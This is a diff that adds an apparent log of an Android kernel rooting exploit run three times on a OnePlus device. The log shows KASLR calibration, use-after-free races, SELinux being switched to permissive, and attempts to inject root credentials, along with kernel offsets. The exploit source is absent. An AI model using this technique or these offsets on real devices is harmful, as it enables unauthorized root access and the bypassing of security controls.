@@ -1,0 +1,233 @@
+# 第 1 次运行
+# 开始：2026-11-11 22:33:59
+# 设备：ä¸å  Ace 5
+# 内核：6.1.157-android14-11-o-g7cdd565ce1ed
+# Profile：6.1.157-android14-11-o-g7cdd565ce1ed
+# 结果：中断 · 耗时 —
+
+[22:33:59] <b> ---- 第 1 次运行开始 ----
+[22:33:59] <s> checking Shizuku status...
+[22:33:59] <s> Shizuku connected: uid=2000
+[22:33:59] <b> kernel release: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:33:59] <b> kernel check passed: OnePlus PKG110 (product=PKG110, device=OP5D2BL1, kernel=6.1.157-android14-11-o-g7cdd565ce1ed)
+[22:33:59] <b> matched kernel profile: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:33:59] <b> profile serialized (308 bytes)
+[22:33:59] <s> binding UserService (version 3)...
+[22:34:00] <b> UserService connected
+[22:34:00] <s> Shizuku ready: uid=2000 seccomp=0
+[22:34:00] <s> ksud staged from manager [me.weishu.kernelsu]: /data/local/tmp/ksud (size=4990848)
+[22:34:00] <s> ksud: /data/local/tmp/ksud
+[22:34:00] <b> cleaning up stale sockets and stop files
+[22:34:00] <s> stale cleanup: 2 node(s) still present (unlink denied while SELinux is Enforcing)
+[22:34:00] [*] stage 1/5 calib_a: running
+[22:34:00] [config] loaded kernel table: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:00] [calib_a] collecting call sites (timer_link=0xffffffc00844bc08, probe 2048 / hold 2s)
+[22:34:00] [kaslr] made=2048
+
+# 第 2 次运行
+# 开始：2026-11-11 22:34:06
+# 设备：ä¸å  Ace 5
+# 内核：6.1.157-android14-11-o-g7cdd565ce1ed
+# Profile：6.1.157-android14-11-o-g7cdd565ce1ed
+# 结果：失败 · 耗时 —
+
+[22:34:06] <b> ---- 第 2 次运行开始 ----
+[22:34:06] <s> checking Shizuku status...
+[22:34:06] <s> Shizuku connected: uid=2000
+[22:34:06] <b> kernel release: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:06] <b> kernel check passed: OnePlus PKG110 (product=PKG110, device=OP5D2BL1, kernel=6.1.157-android14-11-o-g7cdd565ce1ed)
+[22:34:06] <b> matched kernel profile: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:06] <b> profile serialized (308 bytes)
+[22:34:06] <s> binding UserService (version 3)...
+[22:34:06] <b> UserService connected
+[22:34:06] <s> Shizuku ready: uid=2000 seccomp=0
+[22:34:06] <s> ksud staged from manager [me.weishu.kernelsu]: /data/local/tmp/ksud (size=4990848)
+[22:34:06] <s> ksud: /data/local/tmp/ksud
+[22:34:07] <s> error: previous round left native process(es) [19295,19362]
+[22:34:07] <s> error: they still pin the pages holding the injected cred (the set includes the AIO holder children from hold_aio_children)
+[22:34:07] <s> error: killing them would drop that pin and panic the kernel, so this round is aborted instead of cleared
+[22:34:07] <s> reboot the device, then run the pipeline again
+[22:34:07] <b> exploit finished code=8
+
+
+# 第 3 次运行
+# 开始：2026-11-11 22:34:20
+# 设备：ä¸å  Ace 5
+# 内核：6.1.157-android14-11-o-g7cdd565ce1ed
+# Profile：6.1.157-android14-11-o-g7cdd565ce1ed
+# 结果：中断 · 耗时 —
+
+[22:34:20] <b> ---- 第 3 次运行开始 ----
+[22:34:20] <s> checking Shizuku status...
+[22:34:20] <s> Shizuku connected: uid=2000
+[22:34:20] <b> kernel release: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:20] <b> kernel check passed: OnePlus PKG110 (product=PKG110, device=OP5D2BL1, kernel=6.1.157-android14-11-o-g7cdd565ce1ed)
+[22:34:20] <b> matched kernel profile: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:20] <b> profile serialized (308 bytes)
+[22:34:20] <s> binding UserService (version 3)...
+[22:34:21] <b> UserService connected
+[22:34:21] <s> Shizuku ready: uid=2000 seccomp=0
+[22:34:21] <s> ksud staged from manager [me.weishu.kernelsu]: /data/local/tmp/ksud (size=4990848)
+[22:34:21] <s> ksud: /data/local/tmp/ksud
+[22:34:21] <b> cleaning up stale sockets and stop files
+[22:34:21] <s> stale cleanup: 2 node(s) still present (unlink denied while SELinux is Enforcing)
+[22:34:21] [*] stage 1/5 calib_a: running
+[22:34:21] [config] loaded kernel table: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:21] [calib_a] collecting call sites (timer_link=0xffffffc00844bc08, probe 2048 / hold 2s)
+[22:34:21] [kaslr] made=2048
+[22:34:23] [kaslr] done
+[22:34:28] [calib_a] captured raw=536576 bytes
+[22:34:28] [calib_a] candidate call sites: 2
+[22:34:28] [calib_a]   site=0xffffffd8f384bc08 count=2050 slide=0x18eb400000
+[22:34:28] [calib_a] note: slide not 2MiB-aligned (0x18eb156a8c), keep as candidate
+[22:34:28] [calib_a]   site=0xffffffd8f35a2694 count=94 slide=0x18eb156a8c
+[22:34:28] [calib_a] slide = 0x18eb400000  _text = 0xffffffd96b400000
+[22:34:28] C98260_SLIDE=0x18eb400000
+[22:34:28] [calib_a] done
+[22:34:28] <b> KASLR slide = 0x18eb400000
+[22:34:28] [*] stage 1/5 calib_a: ok
+[22:34:28] [*] stage 2/5 calib_b: running
+[22:34:28] [config] loaded kernel table: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:28] [calib_b] slide=0x18eb400000 expected call site=0xffffffd8f384bc08
+[22:34:28] [kaslr] made=4096
+[22:34:29] [kaslr] done
+[22:34:29] [calib_b] order1_pfns=125
+[22:34:38] [calib_b] raw=1654784 bytes
+[22:34:38] <b> linear map base = 0xffffff7f80000000 (confidence 125/134)
+[22:34:38] [calib_b] k_itimer=4098 slab_pages=134
+[22:34:38] [calib_b] page_offset = 0xffffff7f80000000 (score=125/134)
+[22:34:38] [*] stage 2/5 calib_b: ok
+[22:34:38] C98260_PAGE_OFFSET=0xffffff7f80000000
+[22:34:38] [calib_b] done
+[22:34:38] [*] stage 3/5 inject: running
+[22:34:38] <s> oom_score_adj(pid=19769): write=ok, now=-1000
+[22:34:38] <b> injection started (pid held by native), waiting for rootd...
+[22:34:38] [config] loaded kernel table: 6.1.157-android14-11-o-g7cdd565ce1ed
+[22:34:38] [mode] daemon_exit=1
+[22:34:38] [slide] 0x18eb400000
+[22:34:38] [mode] fast=1
+[22:34:38] [config] PAGE=0xffffff7f80000000 TIMER=0xffffffc00844bc08 CRED=0xffffffc008059450 SELINUX=0xffffffc00a29bda0
+[22:34:38] [id] uid=2000 euid=2000 gid=2000
+[22:34:38] [SELinux] enforce=1
+[22:34:38] [trace] kmem_cache_alloc armed=trigger enable=?
+[22:34:38] [task] pid=19769 by=size site=0xffffffd8f37e7400 ptr=0xffffff88d471b840 req=4800 alloc=4800
+[22:34:38] [child-cred] waiting pid=19774
+[22:34:38] [child-cred] warn: mlockall errno=12 rlim=65536/65536
+[22:34:38] [task] hits=1 by_site=0 by_size=1 foreign=0 other=343 task=0xffffff88d471b840 raw=24576 cpus=8 size=4800..5824 want_site=0 max_alloc=4800@0xffffffd8f37e7400
+[22:34:38] [selinux] attempt 1/12 target=0xffffffd8f569bd99
+[22:34:38] [uaf] child=19775 spawned
+[22:34:38] [race_child] enter pid=19775
+[22:34:38] [race_child] vmas ready pid=19775
+[22:34:39] [trace] kmem_cache_alloc armed=trigger enable=?
+[22:34:41] [uaf] captured=2048 chosen=0xffffff88d26b98c0 raw=258048
+[22:34:41] [stream_backfill] tile align=0 off=0x1938
+[22:34:41] [stream_backfill] pairs=4 node_base=0x9526b8 off=0x1938
+[22:34:41] [exec_body] begin tid=19780
+[22:34:41] [killer] old=19780 gone
+[22:34:41] [eok] entered uid=2000 euid=2000
+[22:34:41] [killer] sigkill sent tgid=19775 errno=3
+[22:34:41] [stream_backfill] page_freed=1
+[22:34:42] [stream_backfill] hit pfn=0x9526b8
+[22:34:42] [stream_backfill] writes=400 hit=1
+[22:34:42] [uaf] child=19775 code=2 status=9
+[22:34:42] [cycle] ms=4452 result=ok fast=1
+[22:34:42] [uaf] reaped status=9
+[22:34:42] [SELinux] enforce=1
+[22:34:42] [selinux] attempt 2/12 target=0xffffffd8f569bd99
+[22:34:42] [uaf] child=19836 spawned
+[22:34:42] [race_child] enter pid=19836
+[22:34:42] [race_child] vmas ready pid=19836
+[22:34:42] [trace] kmem_cache_alloc armed=trigger enable=?
+[22:34:44] [uaf] captured=2048 chosen=0xffffff8866838210 raw=249856
+[22:34:44] [stream_backfill] tile align=0 off=0x288
+[22:34:44] [exec_body] begin tid=19844
+[22:34:44] [stream_backfill] pairs=4 node_base=0x8e6838 off=0x288
+[22:34:45] [killer] old=19844 gone
+[22:34:45] [killer] sigkill sent tgid=19836 errno=3
+[22:34:45] [stream_backfill] page_freed=1
+[22:34:45] [stream_backfill] hit pfn=0x8e6838
+[22:34:45] [stream_backfill] writes=200 hit=1
+[22:34:45] [uaf] child=19836 code=2 status=9
+[22:34:45] [cycle] ms=3221 result=ok fast=1
+[22:34:45] [uaf] reaped status=9
+[22:34:45] [SELinux] enforce=0
+[22:34:45] [selinux] already permissive
+[22:34:45] [cred] plant attempt 1/12
+[22:34:45] [uaf] child=19874 spawned
+[22:34:45] [race_child] enter pid=19874
+[22:34:45] [race_child] vmas ready pid=19874
+[22:34:46] [trace] kmem_cache_alloc armed=trigger enable=1*
+[22:34:48] [uaf] captured=2048 chosen=0xffffff88cc2c9ad0 raw=249856
+[22:34:48] [cred] node=0xffffff88cc2c9b48 task+cred=0xffffff88d471c078 off=0x1b48
+[22:34:48] [stream_backfill] pairs=4 node_base=0x94c2c8 off=0x1b48
+[22:34:48] [exec_body] begin tid=19881
+[22:34:48] [killer] old=19881 gone
+[22:34:48] [eok] entered uid=2000 euid=2000
+[22:34:48] [killer] sigkill sent tgid=19874 errno=3
+[22:34:48] [stream_backfill] page_freed=1
+[22:34:49] [stream_backfill] hit pfn=0x94c2c8
+[22:34:49] [stream_backfill] writes=400 hit=1
+[22:34:49] [uaf] child=19874 code=2 status=9
+[22:34:49] [cycle] ms=3773 result=ok fast=1
+[22:34:49] [uaf] reaped status=9
+[22:34:49] [cred] installed at 0xffffff88cc2c9b48
+[22:34:49] [cred] proc State:	S (sleeping)
+[22:34:49] [cred] proc Uid:	2000	2000	2000	2000
+[22:34:49] [cred] proc CapEff:	0000000000000000
+[22:34:49] [uaf] child=19906 spawned
+[22:34:49] [race_child] enter pid=19906
+[22:34:49] [race_child] vmas ready pid=19906
+[22:34:49] [trace] kmem_cache_alloc armed=trigger enable=1*
+[22:34:51] [uaf] captured=2048 chosen=0xffffff8a4bcafde8 raw=249856
+[22:34:51] [stream_backfill] tile align=0 off=0x1e60
+[22:34:51] [stream_backfill] pairs=4 node_base=0xacbcae off=0x1e60
+[22:34:51] [exec_body] begin tid=19911
+[22:34:52] [killer] old=19911 gone
+[22:34:52] [eok] entered uid=2000 euid=2000
+[22:34:52] [stream_backfill] page_freed=1
+[22:34:52] [killer] sigkill sent tgid=19906 errno=3
+[22:34:58] [stream_backfill] writes=1999 hit=0
+[22:34:58] [cycle] ms=8702 result=page_miss fast=1
+[22:34:58] [uaf] page miss, retry
+[22:34:58] [uaf] child=20387 spawned
+[22:34:58] [race_child] enter pid=20387
+[22:34:58] [race_child] vmas ready pid=20387
+[22:34:58] [trace] kmem_cache_alloc armed=trigger enable=1*
+[22:35:00] [uaf] captured=2048 chosen=0xffffff88aa31ad68 raw=249856
+[22:35:00] [stream_backfill] tile align=0 off=0xde0
+[22:35:00] [exec_body] begin tid=20395
+[22:35:00] [stream_backfill] pairs=4 node_base=0x92a31a off=0xde0
+[22:35:00] [killer] old=20395 gone
+[22:35:01] [eok] entered uid=2000 euid=2000
+[22:35:01] [killer] sigkill sent tgid=20387 errno=3
+[22:35:01] [stream_backfill] page_freed=1
+[22:35:02] [stream_backfill] hit pfn=0x92a31a
+[22:35:02] [stream_backfill] writes=600 hit=1
+[22:35:02] [uaf] child=20387 code=2 status=9
+[22:35:02] [cycle] ms=4255 result=ok fast=1
+[22:35:02] [uaf] reaped status=9
+[22:35:02] [uaf] child=20423 spawned
+[22:35:02] [race_child] enter pid=20423
+[22:35:02] [race_child] vmas ready pid=20423
+[22:35:02] [trace] kmem_cache_alloc armed=trigger enable=1*
+[22:35:04] [uaf] captured=2048 chosen=0xffffff8942214840 raw=249856
+[22:35:04] [stream_backfill] tile align=0 off=0x8b8
+[22:35:04] [exec_body] begin tid=20430
+[22:35:04] [stream_backfill] pairs=4 node_base=0x9c2214 off=0x8b8
+[22:35:05] [killer] old=20430 gone
+[22:35:05] [killer] sigkill sent tgid=20423 errno=3
+[22:35:05] [stream_backfill] page_freed=1
+[22:35:06] [stream_backfill] hit pfn=0x9c2214
+[22:35:06] [stream_backfill] writes=200 hit=1
+[22:35:06] [uaf] child=20423 code=2 status=9
+[22:35:06] [cycle] ms=3630 result=ok fast=1
+[22:35:06] [uaf] reaped status=9
+[22:35:06] [cred] answer uid=2000 euid=2000 gid=2000 egid=2000
+[22:35:06] [cred] still uid=2000 euid=2000
+[22:35:06] [cred] plant attempt 2/12
+[22:35:06] [uaf] child=20455 spawned
+[22:35:06] [race_child] enter pid=20455
+[22:35:06] [child-cred] uid=2000 euid=2000 gid=2000 egid=2000
+[22:35:06] [race_child] vmas ready pid=20455
+[22:35:06] [trace] kmem_cache_alloc armed=trigger enable=1*
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
